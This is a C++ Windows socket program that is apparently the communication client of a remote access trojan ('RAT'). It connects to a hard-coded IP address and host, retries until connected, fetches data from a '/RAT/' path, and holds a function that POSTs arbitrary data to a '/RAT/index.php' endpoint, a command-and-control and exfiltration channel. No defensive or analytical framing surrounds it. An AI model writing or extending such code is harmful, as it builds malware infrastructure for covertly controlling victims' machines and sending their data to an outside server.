#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <sstream>

#pragma comment(lib, "ws2_32.lib")

using namespace std;

SOCKET sock;

string get_last_error()
{
    DWORD error = WSAGetLastError();
    if (error == 0) return string();

    LPSTR messageBuffer = nullptr;
    size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);

    string message(messageBuffer, size);

    LocalFree(messageBuffer);

    return message;
}

string receive_response(SOCKET clientSocket)
{
    char buffer[4096]; // Increased buffer size
    string receivedData;
    int bytesReceived;

    do {
        bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0); // Leave space for null terminator

        if (bytesReceived > 0) {
            buffer[bytesReceived] = '\0';
            receivedData += buffer; // Append to the received data
        } else if (bytesReceived == 0) {
            cerr << "Connection closed by server." << endl;
            break; // Exit the loop on clean close
        } else {
            int error = WSAGetLastError();
            if (error != WSAECONNRESET) {
                cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
            }
            break; // Exit loop on error
        }
    } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full

    return receivedData;
}

string getdata(string filename)
{
    string httpRequest = "GET /RAT/"+filename+" HTTP/1.1\r\n";
    httpRequest += "Host: arth.imbeddex.com\r\n";
    httpRequest += "Connection: close\r\n\r\n";

    cout<< httpRequest<<endl;

    int bytesSent = send(sock, httpRequest.c_str(), httpRequest.length(), 0);
    if (bytesSent == SOCKET_ERROR)
    {
        int error = WSAGetLastError();
        cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
    }

    return receive_response(sock);
}

string extractContent(const string& response)
{
    // Robust HTTP response parsing
    size_t headerEnd = response.find("\r\n\r\n");
    if (headerEnd == string::npos) {
        cerr << "Invalid HTTP response: No header/body separator found." << endl;
        return "";
    }

    string body = response.substr(headerEnd + 4);

    //Handle chunked transfer encoding (if present)
    size_t transferEncodingPos = response.find("Transfer-Encoding: chunked");
    if (transferEncodingPos != string::npos)
    {
        string unchunkedBody;
        istringstream bodyStream(body);
        string chunkLengthStr;

        while (getline(bodyStream, chunkLengthStr))
        {
            if (chunkLengthStr.empty() || chunkLengthStr == "\r") continue;

            size_t chunkSize;
            stringstream ss;
            ss << hex << chunkLengthStr;
            ss >> chunkSize;

            if (chunkSize == 0) break; // End of chunked data

            string chunkData(chunkSize, '\0');
            bodyStream.read(&chunkData[0], chunkSize);

            unchunkedBody += chunkData;
            bodyStream.ignore(2); // Consume CRLF after chunk
        }
        body = unchunkedBody;
    }

    return body;
}

void senddata(string data)
{

    string httpRequest = "POST /RAT/index.php HTTP/1.1\r\n";
    httpRequest += "Host: arth.imbeddex.com\r\n";
    httpRequest += "Content-Length: " + to_string(data.length()) + "\r\n";
    httpRequest += "Content-Type: application/octet-stream\r\n";
    httpRequest += "Connection: close\r\n\r\n";
    httpRequest += data;                                                                // Append the actual data

    int bytesSent = send(sock, httpRequest.c_str(), httpRequest.length(), 0);
    if (bytesSent == SOCKET_ERROR)
    {
        int error = WSAGetLastError();
        cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
    }
}

int main()
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        cerr << "WSAStartup failed: " << endl;
        return 1;
    }

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        cerr << "socket failed: " << WSAGetLastError() << endl;
        WSACleanup();
        return 1;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(80);
    if (inet_pton(AF_INET, "103.92.235.21", &serverAddr.sin_addr) <= 0)
    {
        cerr << "Invalid address/ Address family not supported\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    bool connected = false;
    while (!connected)
    {
        if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
        {            
            int error = WSAGetLastError();
            if (error != WSAECONNREFUSED) cerr << "Connection failed with error: " << error << " (" << gai_strerror(error) << "). Retrying in 2 seconds...\n";
            else cerr << "Connection refused. Retrying in 2 seconds...\n";
            Sleep(2000);
        }
        else
        {
            cout << "Connected to the server!\n";
            connected = true;
        }
    }
    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


    //senddata("11111111111111111111111111111111111111111111111111112");
    cout << "Server response -> \n" << extractContent(getdata("Rat_Data")) << "\n\n";
    //cout << receive_response(sock);

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
    closesocket(sock);
    WSACleanup();
    return 0;
}